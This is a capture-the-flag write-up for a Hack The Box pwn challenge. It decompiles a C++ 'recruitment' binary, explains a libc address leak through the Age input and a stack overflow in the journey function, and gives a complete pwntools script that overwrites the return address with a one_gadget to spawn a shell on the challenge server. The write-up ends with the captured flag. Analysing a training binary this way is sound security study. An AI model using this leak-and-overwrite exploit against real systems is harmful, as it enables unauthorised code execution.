We have a c++ binary file and libc. Decompile it: 

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 chocie; // rax
  __int64 v4; // rbx
  char v6[32]; // [rsp+0h] [rbp-280h] BYREF
  __int64 v7; // [rsp+20h] [rbp-260h] BYREF
  __int64 v8; // [rsp+40h] [rbp-240h] BYREF
  char v9[32]; // [rsp+70h] [rbp-210h] BYREF
  __int64 v10; // [rsp+90h] [rbp-1F0h] BYREF
  __int64 v11; // [rsp+B0h] [rbp-1D0h] BYREF
  char v12[112]; // [rsp+E0h] [rbp-1A0h] BYREF
  char v13[47]; // [rsp+150h] [rbp-130h] BYREF
  char v14; // [rsp+17Fh] [rbp-101h] BYREF
  char v15[47]; // [rsp+180h] [rbp-100h] BYREF
  char v16; // [rsp+1AFh] [rbp-D1h] BYREF
  char v17[32]; // [rsp+1B0h] [rbp-D0h] BYREF
  char v18[32]; // [rsp+1D0h] [rbp-B0h] BYREF
  char v19[32]; // [rsp+1F0h] [rbp-90h] BYREF
  char v20[32]; // [rsp+210h] [rbp-70h] BYREF
  char v21[40]; // [rsp+230h] [rbp-50h] BYREF
  char *v22; // [rsp+258h] [rbp-28h]
  char *v23; // [rsp+260h] [rbp-20h]
  _QWORD *profile; // [rsp+268h] [rbp-18h]

  Profile::Profile((Profile *)v9);
  Profile::Profile((Profile *)v6);
  while ( flag != 3 )
  {
    chocie = menu();
    if ( chocie == 3 )
    {
      if ( flag )
      {
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v21, v6);
        journey(v21);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v21);
      }
      else
      {
        error("You need to set up your profile first!\n");
      }
    }
    else
    {
      if ( chocie > 3 )
        goto LABEL_17;
      if ( chocie == 1 )
      {
        if ( flag == 1 )
        {
          error("You cannot create a second profile!\n");
        }
        else
        {
          profile = (_QWORD *)create_profile();
          v4 = profile[2];
          v23 = &v14;
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<std::allocator<char>>(
            v13,
            profile[1],
            &v14);
          v22 = &v16;
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<std::allocator<char>>(
            v15,
            *profile,
            &v16);
          Profile::Profile(v12, v15, v13, v4);
          Profile::operator=(v6, v12);
          Profile::~Profile((Profile *)v12);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v15);
          std::__new_allocator<char>::~__new_allocator(&v16);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v13);
          std::__new_allocator<char>::~__new_allocator(&v14);
        }
      }
      else
      {
        if ( chocie != 2 )
        {
LABEL_17:
          error("Invalid operation! Safety mechanism activated! Abort the room!\n");
          exit(1312);
        }
        if ( flag )
        {
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v19, &v7);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v20, v6);
          Profile::display(v6, v20, v19, &v8);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v20);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v19);
        }
        else
        {
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v17, &v10);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v18, v9);
          Profile::display(v9, v18, v17, &v11);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v18);
          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v17);
        }
      }
    }
  }
  Profile::~Profile((Profile *)v6);
  Profile::~Profile((Profile *)v9);
  return 0;
}
```

- There are 3 options for us: create Profile, display Profile and journey. 
- With option 1, we have permission to create a Profile, with Name, Class and Age:
- 
![image](https://hackmd.io/_uploads/SJ9cL4oVye.png)

- Option 2 just show out what we just input
- Option 3 is journey, with a parameter is a string, i think. 
For create Profile:

```cpp
char **create_profile(void)
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  const char *Name; // rax
  const char *Class; // rax
  char **v8; // rbx
  char Age[256]; // [rsp+0h] [rbp-160h] BYREF
  char v11[32]; // [rsp+100h] [rbp-60h] BYREF
  char v12[32]; // [rsp+120h] [rbp-40h] BYREF
  char **v13; // [rsp+140h] [rbp-20h]
  int i; // [rsp+14Ch] [rbp-14h]

  v13 = (char **)operator new[](0x18uLL);
  for ( i = 0; i <= 2; ++i )
    v13[i] = (char *)operator new[](0x64uLL);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v12);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v11);
  fflush(_bss_start);
  std::operator<<<std::char_traits<char>>();
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v12);
  std::operator<<<std::char_traits<char>>();
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v11);
  std::operator<<<std::char_traits<char>>();
  read(0, Age, 32uLL);
  std::operator<<<std::char_traits<char>>();
  v0 = std::operator<<<std::char_traits<char>>();
  std::operator<<<char,std::char_traits<char>,std::allocator<char>>(v0, v12);
  v1 = std::operator<<<std::char_traits<char>>();
  std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>();
  v2 = std::operator<<<std::char_traits<char>>();
  std::operator<<<char,std::char_traits<char>,std::allocator<char>>(v2, v11);
  v3 = std::operator<<<std::char_traits<char>>();
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>();
  v4 = std::operator<<<std::char_traits<char>>();
  v5 = std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>();
  Age[strcspn(Age, "\n")] = 0;
  Name = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v12);
  strcpy(*v13, Name);
  Class = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v11);
  strcpy(v13[1], Class);
  strcpy(v13[2], Age);
  flag = 1;
  v8 = v13;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v11);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v12);
  return v8;
}
```
It used `cin` to read data of Name and Class, but use `read()` to read data of Age.  

![image](https://hackmd.io/_uploads/S1KcOEj4Jg.png)

![image](https://hackmd.io/_uploads/HkgqdViV1x.png)

After trying input, i saw that when i input Age, sometimes it leaks some suspicious data: 

![image](https://hackmd.io/_uploads/Bk2kF4iN1l.png)

Trying some payloads, i can leak out some libc address: 

![image](https://hackmd.io/_uploads/Hya8cEo4Jl.png)

Calculate the offset, it will be `0x93b00` from libc address. 
So now we have libc address.

![image](https://hackmd.io/_uploads/HyQcc4sNJx.png)

I thought about execute system('/bin/sh') but we have limited input amount left, only `0x2f` bytes in option 3 - `journey`: 
```cpp
__int64 __fastcall journey(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  char v4[8]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-18h]
  __int64 v6; // [rsp+20h] [rbp-10h]
  __int64 v7; // [rsp+28h] [rbp-8h]

  flag = 3;
  std::operator<<<std::char_traits<char>>();
  v1 = std::operator<<<std::char_traits<char>>();
  std::operator<<<char,std::char_traits<char>,std::allocator<char>>(v1, a1);
  std::operator<<<std::char_traits<char>>();
  v2 = std::operator<<<std::char_traits<char>>();
  std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>();
  *(_QWORD *)v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  return std::istream::getline((std::istream *)&std::cin, v4, 0x2FLL);
}
```

But there is something special here. First, it set `flag = 3`, i was thinking about return to option 1 to create another profile because option 1 only checks if `flag == 1` or not, if it's not, it will let us create. But it skipped the create step even i tried how many times. Second, the flow code of `journey` is it set the value from `rbp-0x20` to `rbp-0x8` to 0, then return getline with size `0x2f`. I noticed that i can overflow the return address, because `v4` is in `rbp-0x20`. So now i can execute one gadget to get shell. 
Script: 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./recruitment_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.50.242", 35024)

    return r


def main():
    r = conn()
    input()
    # good luck pwning :)
    r.sendlineafter(b'$ ', b'1')
    r.sendlineafter(b'Name:  ', b'A')
    r.sendlineafter(b'Class: ', b'A'*16)
    r.sendlineafter(b'Age:   ', b'A'* 24)
    r.recvuntil(b'Age:   AAAAAAAAAAAAAAAAAAAAAAAA\n')
    pause()
    leak = u64(r.recv(5) + b'\0\0\0')
    leak = leak << 8
    libc.address = leak - 0x93b00
    info('Libc leak: ' + hex(leak))
    info('Libc: ' + hex(libc.address))
    system = libc.sym['system']
    binsh = next(libc.search('/bin/sh'))
    info('System: ' + hex(system))
    one_gadget = libc.address + 0x583e3
    pause()
    r.sendlineafter(b'$ ', b'3')
    r.sendlineafter(b'mission: ', b'A'*0x28+ p64(one_gadget))
    pause()
    r.interactive()


if __name__ == "__main__":
    main()
# HTB{R34dy_0R_n0t_w3_4r3_c0m1ng_3db8647580a5f8902b7653c8b0e7063a}
```

![image](https://hackmd.io/_uploads/BkFmnVsVJg.png)
